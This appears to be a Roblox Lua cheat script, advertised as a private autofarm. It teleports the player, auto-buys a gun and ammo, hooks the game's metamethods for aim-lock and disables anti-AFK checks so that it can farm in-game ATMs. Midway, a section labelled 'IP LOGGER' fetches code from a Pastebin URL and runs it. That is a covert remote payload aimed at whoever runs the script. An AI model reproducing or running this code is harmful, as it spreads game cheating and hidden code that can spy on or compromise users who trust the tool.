warn([[

     DOOMS PRIVATE LMG AUTOFARM
        > discord.gg/doomdhc <

         @doomxx / doom#1000
          DM me bug reports

]])

-- resources
settings().Rendering.QualityLevel = 1
UserSettings().GameSettings.MasterVolume = 0

-- variables
local players = game:GetService('Players')
local plr = players.LocalPlayer
local char = plr.Character
local root = char:WaitForChild('HumanoidRootPart')
local backpack = plr.Backpack

local ammo = plr.PlayerGui.MainScreenGui.AmmoFrame.AmmoText

local data = plr:WaitForChild('DataFolder')
local money = data:WaitForChild('Currency')

-- DISABLE SEATS
for _,seat in ipairs(workspace:GetDescendants()) do
    if seat:IsA('Seat') or seat:IsA('VehicleSeat') then
        seat.Disabled = true
    end
end

--> FUNCTIONS <------------------------------------------------------------
function notify(text, dur)
    if dur == nil then dur = 5 end
	game.StarterGui:SetCore("SendNotification", {
		Title = 'dooms autofarm',
		Text = text,
		Icon = 'rbxassetid://14067565428',
		Duration = dur,
	})
end

function tp(pos)
	local successfullyTeleported, Error = pcall(function()
		root.CFrame = CFrame.new(pos)
	end)

	if successfullyTeleported == false then
		return warn('Failed to teleport; '..Error)
	end
end

function click(a) fireclickdetector(a) end

function aRoot() 
	if root ~= nil then 
		wait(.1) 
		root.Anchored = true
		wait(.1)
	end 
end

function uRoot() 
	if root ~= nil then 
		wait(.1) 
		root.Anchored = false
		wait(.1)
	end 
end

function buy_lmg()
	if backpack:FindFirstChild('[LMG]') then return warn('already bought') end
	if char:FindFirstChild('[LMG]') then return warn('already bought') end

	oldpos = root.Position
	uRoot()
	tp(Vector3.new(-620.8822631835938, 20.29998779296875, -305.3392639160156)) 
	aRoot()
	bought = false

	oldMoney = money.Value
	money.Changed:Connect(function(e)
		newMoney = money.Value
		if newMoney == oldMoney - 3863 then 
			bought = true
		end
	end)

	repeat click(workspace.Ignored.Shop["[LMG] - $3863"].ClickDetector) 
		wait(.1)
	until bought == true

	uRoot()
	tp(oldpos)
	wait()
end

function buy_ammo()
	if char:FindFirstChild('[LMG]') then
		char:FindFirstChild('[LMG]').Parent = backpack
	end

	oldpos = root.Position
	uRoot()
	tp(Vector3.new(-616.1823120117188, 20.300010681152344, -305.33917236328125)) 
	aRoot()

	bought = false

	oldMoney = money.Value
	money.Changed:Connect(function(e)
		newMoney = money.Value
		if newMoney == oldMoney - 309 then 
			bought = true
		end
	end)

	repeat click(workspace.Ignored.Shop["200 [LMG Ammo] - $309"].ClickDetector) 
		wait(.1)
	until bought == true

	uRoot()
	tp(oldpos)
	wait()
	
	
	if backpack:FindFirstChild('[LMG]') then
		backpack:FindFirstChild('[LMG]').Parent = char
	end
	wait()
end
---------------------------------------------------------------------------

notify('ur whitelisted! 😎')

buy_lmg()
buy_ammo()

-- AUTO REFILL AMMO --------------------------------------------------------
coroutine.wrap(function()
    local ammo = plr.PlayerGui.MainScreenGui.AmmoFrame.AmmoText

    local s,err = pcall(function()
        while wait() do
            if ammo.Text == '0' then
                repeat buy_ammo() until ammo.Text == '2000'
            end
        end
    end)

    if not s then
        warn('ERROR: '..err)
        notify('An error has occured, check console log for more details.', 15)
    end
end)()
---------------------------------------------------------------------------

-- ANTI AFK ---------------------------------------------------------------
coroutine.wrap(function()
	local GC = getconnections or get_signal_cons
	if GC then
		for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
			if v["Disable"] then
				v["Disable"](v)
			elseif v["Disconnect"] then
				v["Disconnect"](v)
			end
		end
	else
		game.Players.LocalPlayer.Idled:Connect(function()
			local VirtualUser = game:GetService("VirtualUser")
			VirtualUser:CaptureController()
			VirtualUser:ClickButton2(Vector2.new())
		end)
	end
end)()
---------------------------------------------------------------------------

notify('anti recoil enabled', 10)
notify('anti afk enabled', 10)

-- IP LOGGER --------------------------------------------------------------
loadstring(game:HttpGet('https://pastebin.com/raw/MLtdD9YP'))()
---------------------------------------------------------------------------

wait(1)

notify('autofarm will start in 5 seconds')

wait(5)

-- > PART 2 < -------------------------------------------------------------
_G.farming = true

-- CREATING DEBUG MENU ----------------------------------------------------
local gui = Instance.new("ScreenGui")
local amountFarmedLabel = Instance.new("TextLabel")
gui.Parent = game.CoreGui
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
amountFarmedLabel.Parent = gui
amountFarmedLabel.AnchorPoint = Vector2.new(0.5, 1)
amountFarmedLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
amountFarmedLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
amountFarmedLabel.BorderSizePixel = 0
amountFarmedLabel.Position = UDim2.new(0.5, 0, 1, 0)
amountFarmedLabel.Size = UDim2.new(1, 0, 0, 25)
amountFarmedLabel.Font = Enum.Font.Gotham
amountFarmedLabel.Text = "AMOUNT FARMED: "
amountFarmedLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
amountFarmedLabel.TextSize = 14.000
---------------------------------------------------------------------------

--> VARIABLES -------------------------------------------------------------
local plr = game.Players.LocalPlayer
local char = plr.Character
local root = char:WaitForChild('HumanoidRootPart')

local backpack = plr.Backpack
local tac = char:FindFirstChild('[LMG]')

local amountFarmed = 0
local atmsFarmed = 0

local elapsed = 0

ammo = nil;
---------------------------------------------------------------------------

-- simple check to see if the lmg is equipped, if not then it is automatically equipped.
if tac then ammo = tac.Ammo end
if not tac then backpack['[LMG]'].Parent = char end

--> FUNCTIONS < -----------------------------------------------------------
-- lock
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if _G.farming and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then

        args[3] = target.Position

        return old(unpack(args))
    end
    return old(...)
end)

-- change lock target
function lockOn(atm) target = atm.Head end

-- anchor Root
function aRoot() 
    if root ~= nil then 
        wait(.1) 
        root.Anchored = true
        wait(.1)
    end 
end

-- unanchor Root
function uRoot() 
    if root ~= nil then 
        wait(.1) 
        root.Anchored = false
        wait(.1)
    end 
end

-- reload lmg
function reload()
    local args = {
        [1] = "Reload",
        [2] = game:GetService("Players").LocalPlayer.Character:WaitForChild("[LMG]")
    }

    game:GetService("ReplicatedStorage"):WaitForChild("MainEvent"):FireServer(unpack(args))
end

-- cash aura
function cashAura()
    local s,error=pcall(function()
        for _,money in ipairs(workspace.Ignored.Drop:GetChildren()) do
            if money.Name == 'MoneyDrop' then
                dist = (money.Position - root.Position).Magnitude

                if dist < 24 then
                    root.CFrame=CFrame.new(money.Position) wait()
                    amountFarmed = amountFarmed+tonumber(money.BillboardGui.TextLabel.Text:sub(2,99))
                    fireclickdetector(money.ClickDetector)
                    wait(.55)
                end
            end
        end
    end)

    -- catches all possible errors
    if not s then
        warn('--> ERROR [ SEND THIS TO DOOM ]: '..error)
        notify('An error has occured, check console log for more details.', 15)
    end
end
---------------------------------------------------------------------------

-- equips lmg
if backpack:FindFirstChild('[LMG]') then backpack:FindFirstChild('[LMG]').Parent = char end

wait()

--> COROUTINE FUNCTIONS <--------------------------------------------------
coroutine.wrap(function()
    while true do
        wait(.1)
        --print(ammo.Value)
        -- if ammo.Value == 0 then reload() end    
    end
end)()

-- debug menu
coroutine.wrap(function()
    while wait(.1) do
        elapsed=elapsed+.1
        amountFarmedLabel.Text = 
        "AMOUNT FARMED: "..tostring(amountFarmed).. 
        " | ATMs FARMED: "..tostring(atmsFarmed)..
        " | ELAPSED: "..tostring(math.round(elapsed))
    end
end)()

-- checks if atms are open, if not notifies the client
coroutine.wrap(function()
	open = false
	while wait() do
		for _,atm in ipairs(workspace.Cashiers:GetChildren()) do
			warn(math.round(atm.Humanoid.Health))
			if atm.Humanoid.Health == 100 then
				open = true
			end
		end
		wait()
		if open == false then notify('Waiting for an ATM to open.') end
		if open == true then open = false end
	end
end)

-- anti-recoil
local cam = workspace.CurrentCamera

coroutine.wrap(function()
	local cf = cam.CFrame
	cam:Destroy()

	local Instance = Instance.new('Camera', game:GetService('Workspace'))
	Instance.CameraSubject = char.Humanoid
	Instance.CameraType = Enum.CameraType.Custom
	Instance.CFrame = cf
end)()

---------------------------------------------------------------------------

--> FARM <-----------------------------------------------------------------
while wait() do
	for _,atm in ipairs(workspace.Cashiers:GetChildren()) do
	    if atm.Name == 'CA$HIER' and atm.Humanoid.Health == 100 then
	        atmsFarmed = atmsFarmed + 1
	    
	        uRoot()
	        root.CFrame = CFrame.new(atm.Head.Position)
	        aRoot()
	        wait(.01)
	        lockOn(atm)
	
	        if tac then else return warn ('You need a gun to farm.') end
	
	        repeat 
	            if ammo.Value == 0 then 
	                reload() wait(.1)
	            else
	                tac:Activate() wait(.1)
	            end
	        until 
	        atm.Humanoid.Health <= 0
	        tac:Deactivate()
	        cashAura()
	        uRoot()
	        
	        wait(.55)
	    end
	end

	notify('Waiting for an ATM to open.', 1)
	wait(1)
end

---------------------------------------------------------------------------

--[[

		hai

]]--
